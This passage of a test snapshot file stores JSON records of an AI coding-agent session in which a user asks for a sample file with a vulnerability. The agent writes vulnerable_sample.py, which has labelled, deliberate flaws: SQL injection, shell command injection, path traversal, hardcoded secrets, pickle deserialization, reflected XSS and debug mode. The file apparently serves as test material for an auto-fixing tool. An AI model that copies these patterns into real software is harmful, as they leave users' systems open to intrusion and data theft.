    "value": "{"_v":3,"type":1,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"4406afdc-eddf-4217-ba6b-e4e7600f60be","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":true,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"6d1e3d0b-eeca-4c57-85da-79bedc8ed579","attachedFoldersListDirResults":[],"humanChanges":[],"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[1,41,7,38,8,9,11,12,15,18,19,25,27,43,46,47,29,30,32,34,35,39,40,42,44,45],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[{"relativeWorkspacePath":"random_file.txt","startLineNumber":1,"lines":[],"languageIdentifier":"","intent":7,"isOnlyIncludedFromFolder":false},{"relativeWorkspacePath":"clients/cursor_ext/tsconfig.json","startLineNumber":1,"lines":[],"languageIdentifier":"","intent":8,"isOnlyIncludedFromFolder":false}],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-11-05T12:12:20.168Z","isQuickSearchQuery":false,"richText":"{\\"root\\":{\\"children\\":[{\\"children\\":[{\\"detail\\":0,\\"format\\":0,\\"mode\\":\\"normal\\",\\"style\\":\\"\\",\\"text\\":\\"can we have a new sample code file with a vulnerability in repo root?\\",\\"type\\":\\"text\\",\\"version\\":1}],\\"direction\\":\\"ltr\\",\\"format\\":\\"\\",\\"indent\\":0,\\"type\\":\\"paragraph\\",\\"version\\":1}],\\"direction\\":\\"ltr\\",\\"format\\":\\"\\",\\"indent\\":0,\\"type\\":\\"root\\",\\"version\\":1}}","text":"can we have a new sample code file with a vulnerability in repo root?","editToolSupportsSearchAndReplace":true,"modelInfo":{"modelName":"default"},"isNudge":false,"contextWindowStatusAtCreation":{"percentageRemaining":91,"percentageRemainingFloat":91.91600036621094},"skipRendering":false,"isPlanExecution":false,"context":{"composers":[],"quotes":[],"selectedCommits":[],"selectedPullRequests":[],"selectedImages":[],"folderSelections":[],"fileSelections":[],"terminalFiles":[],"selections":[],"terminalSelections":[],"selectedDocs":[],"externalLinks":[],"cursorRules":[],"cursorCommands":[],"uiElementSelections":[],"consoleLogs":[],"mentions":{"composers":{},"quotes":{},"selectedCommits":{},"selectedPullRequests":{},"gitDiff":[],"gitDiffFromBranchToMain":[],"selectedImages":{},"useWeb":[],"folderSelections":{},"fileSelections":{},"terminalFiles":{},"selections":{},"terminalSelections":{},"selectedDocs":{},"externalLinks":{},"useLinterErrors":[],"useDiffReview":[],"useGenerateRules":[],"useContextPicking":[],"useRememberThis":[],"diffHistory":[],"cursorRules":{},"cursorCommands":{},"autoContext":[],"uiElementSelections":{},"consoleLogs":{},"ideEditorsState":[]},"ideEditorsState":true},"checkpointId":"3f9df47e-a34d-4ec5-b86f-946dc401e737"}",
  },
]
`;

exports[`extension tests > 'full database scenario with thinking …' > full-thinking-state.vscdb-getRowsByLike-result-14 1`] = `
[
  {
    "key": "bubbleId:59ce5fe8-21af-47bd-8ace-eedc0956072b:cd8709f0-eaf3-40a0-9694-16f1148756c9",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"cd8709f0-eaf3-40a0-9694-16f1148756c9","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"6d1e3d0b-eeca-4c57-85da-79bedc8ed579","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-11-05T12:12:20.223Z","isQuickSearchQuery":false,"codeBlocks":[],"text":"","modelInfo":{"modelName":"default"},"timingInfo":{"clientStartTime":72349.79999995232,"clientRpcSendTime":1762344740223,"clientSettleTime":1762344767889,"clientEndTime":1762344767889},"serverBubbleId":"33d9cb36-7f74-474c-a5cd-15a7fb1bae04","usageUuid":"6d1e3d0b-eeca-4c57-85da-79bedc8ed579","capabilityType":30,"thinking":{"text":"","signature":"BSqSf1k-siXI1ty3Ms_3oGqTDvv3YYAljzdXgKkjVYb0_RVKRFMEmANlJ4o1a40hu4ffemayun3AIMaxk9Kv_llJ_sXSZ-XcHDrDy-WcOl7Z7EtQS_syS5Ob8D3qhxvHQ8ghjzSdWb6Vjlw7quTGxxn3oUiHnB3eg0ARY0pWtFCf0COZPruipLVItCLfA1swalB1XdvICeTzk1p_WL9mQSqF0OVLaJHJ19KQTR2ZEI2PKZSLergf_wsMN8LFJPYFlZa62oazO7Q_dazAsVZJKwNWhAmpPasR6umsz88-QnwWdthm6JrMqawrctGP7DYOk4ozJOa8W0iWMxEzpaGt9MFDVIuCsf33EOY32lv0vCYGsGj1k8jCK37RD8CIdP4zWmklriJAIi5RLdDee8QNKrWS0ZqK21igj1Ft3yr_ECqV61kQnBKFmbxSNm9X6gKVsLrrdFvQKcI9oSTIlFPvv1sQRq51tVgHlRc_DrermqygXbCP9TBu7j2mPqWcjHf2Xl3KgSlgQtP_6q2k-DSeRYcIChegPpJIUHlJcrYnttle3GheUwu4Sqkar1Ia-diavmDTx2dO6clFn6FtuGRmEEFbjgPL3NcyqnTFmzDFToVqRc1vWWYbnbVOO05Z34almBjdjPCejXS2br7s-N_4N6Tp0sWLnFGosi2LsW5qnL2nQx91X95Y9gi-fvS36qmOYKgTmJiMcPjsIOO6GxWHiG9sPVNsCKWDNpHqOYISAK17qPSslx4Zr7onBFItWHM3xBsnLCjnFBDaI7EFVCNvAbSNcqzElxDHfLupWem_XqzIfKSGBkfUqSDbTq3k7EIq4fDkTsE2wPn50nLgeIBN9iSGlG786g6LVHrRBHhDYG_qDPrCI4qzsdzQ_2c2OPpJa-FG_qfj8li-lKAriw_Sf5iVp29SuDKHrLejM84xa1HIyt3n1UD2PP308OCVSHFPV5_3LM66ZAtWYwdMst8yjQ_m-Gwc9Ji-zLRHbnKLzDVzx3NZgl6kzg1lyb8Qbfr6jDna6zpyyRIlKMDwQjWa1-Yc47MpI98_mG_ipPYsc_5FDiKbr_ImEkmmhaYztdPyTUMXd-os_uCgRQ"},"thinkingDurationMs":3816}",
  },
]
`;

exports[`extension tests > 'full database scenario with thinking …' > full-thinking-state.vscdb-getRowsByLike-result-15 1`] = `
[
  {
    "key": "bubbleId:59ce5fe8-21af-47bd-8ace-eedc0956072b:3b499564-1816-40db-835a-23e08a45b8a4",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"3b499564-1816-40db-835a-23e08a45b8a4","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-11-05T12:12:25.929Z","isQuickSearchQuery":false,"text":"\\nCreating a sample code file with a vulnerability in the repo root for testing.\\n","usageUuid":"6d1e3d0b-eeca-4c57-85da-79bedc8ed579"}",
  },
]
`;

exports[`extension tests > 'full database scenario with thinking …' > full-thinking-state.vscdb-getRowsByLike-result-16 1`] = `
[
  {
    "key": "bubbleId:59ce5fe8-21af-47bd-8ace-eedc0956072b:0773d3a3-ed1a-4890-99a3-38ec69a6d85d",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"0773d3a3-ed1a-4890-99a3-38ec69a6d85d","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-11-05T12:12:26.053Z","isQuickSearchQuery":false,"codeBlocks":[{"uri":{"scheme":"file","authority":"","path":"/Users/jonathanafek/src/autofixer/vulnerable_sample.py","query":"","fragment":"","_formatted":"file:///Users/jonathanafek/src/autofixer/vulnerable_sample.py","_fsPath":"/Users/jonathanafek/src/autofixer/vulnerable_sample.py"},"codeblockId":"c1fe6743-d2fd-4ac7-8caf-324502a41ea1","codeBlockIdx":0,"content":"#!/usr/bin/env python3\\n\\"\\"\\"\\nSample vulnerable code file for testing purposes.\\nThis file contains intentional security vulnerabilities - DO NOT USE IN PRODUCTION.\\n\\"\\"\\"\\n\\nimport os\\nimport subprocess\\nimport sqlite3\\nfrom flask import Flask, request\\n\\napp = Flask(__name__)\\n\\n# VULNERABILITY 1: SQL Injection\\ndef get_user_data(username):\\n    \\"\\"\\"Vulnerable SQL query - concatenates user input directly into SQL.\\"\\"\\"\\n    conn = sqlite3.connect('users.db')\\n    cursor = conn.cursor()\\n    \\n    # VULNERABLE: Direct string concatenation allows SQL injection\\n    query = f\\"SELECT * FROM users WHERE username = '{username}'\\"\\n    cursor.execute(query)\\n    result = cursor.fetchone()\\n    conn.close()\\n    return result\\n\\n\\n# VULNERABILITY 2: Command Injection\\ndef list_files(directory):\\n    \\"\\"\\"Vulnerable command execution - uses user input in shell command.\\"\\"\\"\\n    # VULNERABLE: User input passed directly to shell command\\n    result = subprocess.run(f\\"ls -la {directory}\\", shell=True, capture_output=True)\\n    return result.stdout.decode()\\n\\n\\n# VULNERABILITY 3: Path Traversal\\ndef read_file(filename):\\n    \\"\\"\\"Vulnerable file access - no path validation.\\"\\"\\"\\n    # VULNERABLE: No validation allows accessing files outside intended directory\\n    file_path = f\\"/var/www/uploads/{filename}\\"\\n    with open(file_path, 'r') as f:\\n        return f.read()\\n\\n\\n# VULNERABILITY 4: Hardcoded Secret\\nAPI_KEY = \\"sk_live_1234567890abcdef\\"  # VULNERABLE: Hardcoded secret key\\nDATABASE_PASSWORD = \\"admin123\\"  # VULNERABLE: Hardcoded password\\n\\n\\n# VULNERABILITY 5: Insecure Deserialization\\nimport pickle\\n\\ndef load_user_data(data):\\n    \\"\\"\\"Vulnerable deserialization - uses pickle which can execute arbitrary code.\\"\\"\\"\\n    # VULNERABLE: Pickle can execute arbitrary code during deserialization\\n    user_data = pickle.loads(data)\\n    return user_data\\n\\n\\n# VULNERABILITY 6: XSS (if this were a web template)\\n@app.route('/search')\\ndef search():\\n    \\"\\"\\"Vulnerable endpoint - returns user input without sanitization.\\"\\"\\"\\n    query = request.args.get('q', '')\\n    # VULNERABLE: User input returned directly without escaping\\n    return f\\"<h1>Search results for: {query}</h1>\\"\\n\\n\\nif __name__ == '__main__':\\n    app.run(debug=True)  # VULNERABLE: Debug mode enabled in production\\n","languageId":"python"}],"text":"","capabilityType":15,"toolFormerData":{"tool":38,"toolIndex":1,"modelCallId":"811f23d0-408e-4812-a78a-d986e3544bae","toolCallId":"tool_e77f0c03-54ca-4c4b-b81d-d51fe337eb3","status":"completed","rawArgs":"{\\"file_path\\": \\"/Users/jonathanafek/src/autofixer/vulnerable_sample.py\\", \\"contents\\": \\"#!/usr/bin/env python3\\\\n\\\\\\"\\\\\\"\\\\\\"\\\\nSample vulnerable code file for testing purposes.\\\\nThis file contains intentional security vulnerabilities - DO NOT USE IN PRODUCTION.\\\\n\\\\\\"\\\\\\"\\\\\\"\\\\n\\\\nimport os\\\\nimport subprocess\\\\nimport sqlite3\\\\nfrom flask import Flask, request\\\\n\\\\napp = Flask(__name__)\\\\n\\\\n# VULNERABILITY 1: SQL Injection\\\\ndef get_user_data(username):\\\\n    \\\\\\"\\\\\\"\\\\\\"Vulnerable SQL query - concatenates user input directly into SQL.\\\\\\"\\\\\\"\\\\\\"\\\\n    conn = sqlite3.connect('users.db')\\\\n    cursor = conn.cursor()\\\\n    \\\\n    # VULNERABLE: Direct string concatenation allows SQL injection\\\\n    query = f\\\\\\"SELECT * FROM users WHERE username = '{username}'\\\\\\"\\\\n    cursor.execute(query)\\\\n    result = cursor.fetchone()\\\\n    conn.close()\\\\n    return result\\\\n\\\\n\\\\n# VULNERABILITY 2: Command Injection\\\\ndef list_files(directory):\\\\n    \\\\\\"\\\\\\"\\\\\\"Vulnerable command execution - uses user input in shell command.\\\\\\"\\\\\\"\\\\\\"\\\\n    # VULNERABLE: User input passed directly to shell command\\\\n    result = subprocess.run(f\\\\\\"ls -la {directory}\\\\\\", shell=True, capture_output=True)\\\\n    return result.stdout.decode()\\\\n\\\\n\\\\n# VULNERABILITY 3: Path Traversal\\\\ndef read_file(filename):\\\\n    \\\\\\"\\\\\\"\\\\\\"Vulnerable file access - no path validation.\\\\\\"\\\\\\"\\\\\\"\\\\n    # VULNERABLE: No validation allows accessing files outside intended directory\\\\n    file_path = f\\\\\\"/var/www/uploads/{filename}\\\\\\"\\\\n    with open(file_path, 'r') as f:\\\\n        return f.read()\\\\n\\\\n\\\\n# VULNERABILITY 4: Hardcoded Secret\\\\nAPI_KEY = \\\\\\"sk_live_1234567890abcdef\\\\\\"  # VULNERABLE: Hardcoded secret key\\\\nDATABASE_PASSWORD = \\\\\\"admin123\\\\\\"  # VULNERABLE: Hardcoded password\\\\n\\\\n\\\\n# VULNERABILITY 5: Insecure Deserialization\\\\nimport pickle\\\\n\\\\ndef load_user_data(data):\\\\n    \\\\\\"\\\\\\"\\\\\\"Vulnerable deserialization - uses pickle which can execute arbitrary code.\\\\\\"\\\\\\"\\\\\\"\\\\n    # VULNERABLE: Pickle can execute arbitrary code during deserialization\\\\n    user_data = pickle.loads(data)\\\\n    return user_data\\\\n\\\\n\\\\n# VULNERABILITY 6: XSS (if this were a web template)\\\\n@app.route('/search')\\\\ndef search():\\\\n    \\\\\\"\\\\\\"\\\\\\"Vulnerable endpoint - returns user input without sanitization.\\\\\\"\\\\\\"\\\\\\"\\\\n    query = request.args.get('q', '')\\\\n    # VULNERABLE: User input returned directly without escaping\\\\n    return f\\\\\\"<h1>Search results for: {query}</h1>\\\\\\"\\\\n\\\\n\\\\nif __name__ == '__main__':\\\\n    app.run(debug=True)  # VULNERABLE: Debug mode enabled in production\\\\n\\"}","name":"write","userDecision":"accepted","params":"{\\"relativeWorkspacePath\\":\\"/Users/jonathanafek/src/autofixer/vulnerable_sample.py\\"}","additionalData":{"codeblockId":"c1fe6743-d2fd-4ac7-8caf-324502a41ea1","reviewData":{"status":"None","selectedOption":"accept","isShowingInput":false,"firstTimeReviewMode":false}},"result":"{\\"diff\\":{\\"chunks\\":[{\\"diffString\\":\\"- \\\\n+ #!/usr/bin/env python3\\\\n+ \\\\\\"\\\\\\"\\\\\\"\\\\n+ Sample vulnerable code file for testing purposes.\\\\n+ This file contains intentional security vulnerabilities - DO NOT USE IN PRODUCTION.\\\\n+ \\\\\\"\\\\\\"\\\\\\"\\\\n+ \\\\n+ import os\\\\n+ import subprocess\\\\n+ import sqlite3\\\\n+ from flask import Flask, request\\\\n+ \\\\n+ app = Flask(__name__)\\\\n+ \\\\n+ # VULNERABILITY 1: SQL Injection\\\\n+ def get_user_data(username):\\\\n+     \\\\\\"\\\\\\"\\\\\\"Vulnerable SQL query - concatenates user input directly into SQL.\\\\\\"\\\\\\"\\\\\\"\\\\n+     conn = sqlite3.connect('users.db')\\\\n+     cursor = conn.cursor()\\\\n+     \\\\n+     # VULNERABLE: Direct string concatenation allows SQL injection\\\\n+     query = f\\\\\\"SELECT * FROM users WHERE username = '{username}'\\\\\\"\\\\n+     cursor.execute(query)\\\\n+     result = cursor.fetchone()\\\\n+     conn.close()\\\\n+     return result\\\\n+ \\\\n+ \\\\n+ # VULNERABILITY 2: Command Injection\\\\n+ def list_files(directory):\\\\n+     \\\\\\"\\\\\\"\\\\\\"Vulnerable command execution - uses user input in shell command.\\\\\\"\\\\\\"\\\\\\"\\\\n+     # VULNERABLE: User input passed directly to shell command\\\\n+     result = subprocess.run(f\\\\\\"ls -la {directory}\\\\\\", shell=True, capture_output=True)\\\\n+     return result.stdout.decode()\\\\n+ \\\\n+ \\\\n+ # VULNERABILITY 3: Path Traversal\\\\n+ def read_file(filename):\\\\n+     \\\\\\"\\\\\\"\\\\\\"Vulnerable file access - no path validation.\\\\\\"\\\\\\"\\\\\\"\\\\n+     # VULNERABLE: No validation allows accessing files outside intended directory\\\\n+     file_path = f\\\\\\"/var/www/uploads/{filename}\\\\\\"\\\\n+     with open(file_path, 'r') as f:\\\\n+         return f.read()\\\\n+ \\\\n+ \\\\n+ # VULNERABILITY 4: Hardcoded Secret\\\\n+ API_KEY = \\\\\\"sk_live_1234567890abcdef\\\\\\"  # VULNERABLE: Hardcoded secret key\\\\n+ DATABASE_PASSWORD = \\\\\\"admin123\\\\\\"  # VULNERABLE: Hardcoded password\\\\n+ \\\\n+ \\\\n+ # VULNERABILITY 5: Insecure Deserialization\\\\n+ import pickle\\\\n+ \\\\n+ def load_user_data(data):\\\\n+     \\\\\\"\\\\\\"\\\\\\"Vulnerable deserialization - uses pickle which can execute arbitrary code.\\\\\\"\\\\\\"\\\\\\"\\\\n+     # VULNERABLE: Pickle can execute arbitrary code during deserialization\\\\n+     user_data = pickle.loads(data)\\\\n+     return user_data\\\\n+ \\\\n+ \\\\n+ # VULNERABILITY 6: XSS (if this were a web template)\\\\n+ @app.route('/search')\\\\n+ def search():\\\\n+     \\\\\\"\\\\\\"\\\\\\"Vulnerable endpoint - returns user input without sanitization.\\\\\\"\\\\\\"\\\\\\"\\\\n+     query = request.args.get('q', '')\\\\n+     # VULNERABLE: User input returned directly without escaping\\\\n+     return f\\\\\\"<h1>Search results for: {query}</h1>\\\\\\"\\\\n+ \\\\n+ \\\\n+ if __name__ == '__main__':\\\\n+     app.run(debug=True)  # VULNERABLE: Debug mode enabled in production\\\\n+ \\",\\"oldStart\\":1,\\"newStart\\":1,\\"oldLines\\":1,\\"newLines\\":71,\\"linesRemoved\\":1,\\"linesAdded\\":71}],\\"editor\\":\\"EDITOR_AI\\"},\\"shouldAutoFixLints\\":true,\\"resultForModel\\":\\"Wrote contents to /Users/jonathanafek/src/autofixer/vulnerable_sample.py.\\",\\"contentsAfterEdit\\":\\"#!/usr/bin/env python3\\\\n\\\\\\"\\\\\\"\\\\\\"\\\\nSample vulnerable code file for testing purposes.\\\\nThis file contains intentional security vulnerabilities - DO NOT USE IN PRODUCTION.\\\\n\\\\\\"\\\\\\"\\\\\\"\\\\n\\\\nimport os\\\\nimport subprocess\\\\nimport sqlite3\\\\nfrom flask import Flask, request\\\\n\\\\napp = Flask(__name__)\\\\n\\\\n# VULNERABILITY 1: SQL Injection\\\\ndef get_user_data(username):\\\\n    \\\\\\"\\\\\\"\\\\\\"Vulnerable SQL query - concatenates user input directly into SQL.\\\\\\"\\\\\\"\\\\\\"\\\\n    conn = sqlite3.connect('users.db')\\\\n    cursor = conn.cursor()\\\\n    \\\\n    # VULNERABLE: Direct string concatenation allows SQL injection\\\\n    query = f\\\\\\"SELECT * FROM users WHERE username = '{username}'\\\\\\"\\\\n    cursor.execute(query)\\\\n    result = cursor.fetchone()\\\\n    conn.close()\\\\n    return result\\\\n\\\\n\\\\n# VULNERABILITY 2: Command Injection\\\\ndef list_files(directory):\\\\n    \\\\\\"\\\\\\"\\\\\\"Vulnerable command execution - uses user input in shell command.\\\\\\"\\\\\\"\\\\\\"\\\\n    # VULNERABLE: User input passed directly to shell command\\\\n    result = subprocess.run(f\\\\\\"ls -la {directory}\\\\\\", shell=True, capture_output=True)\\\\n    return result.stdout.decode()\\\\n\\\\n\\\\n# VULNERABILITY 3: Path Traversal\\\\ndef read_file(filename):\\\\n    \\\\\\"\\\\\\"\\\\\\"Vulnerable file access - no path validation.\\\\\\"\\\\\\"\\\\\\"\\\\n    # VULNERABLE: No validation allows accessing files outside intended directory\\\\n    file_path = f\\\\\\"/var/www/uploads/{filename}\\\\\\"\\\\n    with open(file_path, 'r') as f:\\\\n        return f.read()\\\\n\\\\n\\\\n# VULNERABILITY 4: Hardcoded Secret\\\\nAPI_KEY = \\\\\\"sk_live_1234567890abcdef\\\\\\"  # VULNERABLE: Hardcoded secret key\\\\nDATABASE_PASSWORD = \\\\\\"admin123\\\\\\"  # VULNERABLE: Hardcoded password\\\\n\\\\n\\\\n# VULNERABILITY 5: Insecure Deserialization\\\\nimport pickle\\\\n\\\\ndef load_user_data(data):\\\\n    \\\\\\"\\\\\\"\\\\\\"Vulnerable deserialization - uses pickle which can execute arbitrary code.\\\\\\"\\\\\\"\\\\\\"\\\\n    # VULNERABLE: Pickle can execute arbitrary code during deserialization\\\\n    user_data = pickle.loads(data)\\\\n    return user_data\\\\n\\\\n\\\\n# VULNERABILITY 6: XSS (if this were a web template)\\\\n@app.route('/search')\\\\ndef search():\\\\n    \\\\\\"\\\\\\"\\\\\\"Vulnerable endpoint - returns user input without sanitization.\\\\\\"\\\\\\"\\\\\\"\\\\n    query = request.args.get('q', '')\\\\n    # VULNERABLE: User input returned directly without escaping\\\\n    return f\\\\\\"<h1>Search results for: {query}</h1>\\\\\\"\\\\n\\\\n\\\\nif __name__ == '__main__':\\\\n    app.run(debug=True)  # VULNERABLE: Debug mode enabled in production\\\\n\\\\n\\"}"},"checkpointId":"9a40c55f-70bc-459e-a478-7fae8f0843e7"}",
  },
]
`;

exports[`extension tests > 'full database scenario with thinking …' > full-thinking-state.vscdb-getRowsByLike-result-17 1`] = `
[
  {
    "key": "bubbleId:59ce5fe8-21af-47bd-8ace-eedc0956072b:57884749-b01a-4465-9de9-36feb1d7cbb3",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"57884749-b01a-4465-9de9-36feb1d7cbb3","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-11-05T12:12:26.053Z","isQuickSearchQuery":false,"codeBlocks":[],"text":"","serverBubbleId":"3685727a-1f95-4ff2-ae4d-cf5482deddbb","usageUuid":"6d1e3d0b-eeca-4c57-85da-79bedc8ed579","capabilityType":30,"thinking":{"text":"","signature":"xsqhumL_ulGAZM3pj5BcLa0gcRjJy7XqeJv8g3BN9Ffjfi0QIFqgi-TohrXPItpIvF8AIg5h655zPkKfjCO4bJZ6jUwxFtRYwlWr4RmnHgJp7ODw8D6mSJ8u2Gend4vY5_qSy0EfDxthIShtvaEaUw20R3nSrBJeYHaMUgzNUbOahw"},"thinkingDurationMs":363}",
  },
]
`;

exports[`extension tests > 'full database scenario with thinking …' > full-thinking-state.vscdb-getRowsByLike-result-18 1`] = `
[
  {
    "key": "bubbleId:59ce5fe8-21af-47bd-8ace-eedc0956072b:17026129-738c-49a4-ab74-a49b64a0846e",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"17026129-738c-49a4-ab74-a49b64a0846e","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-11-05T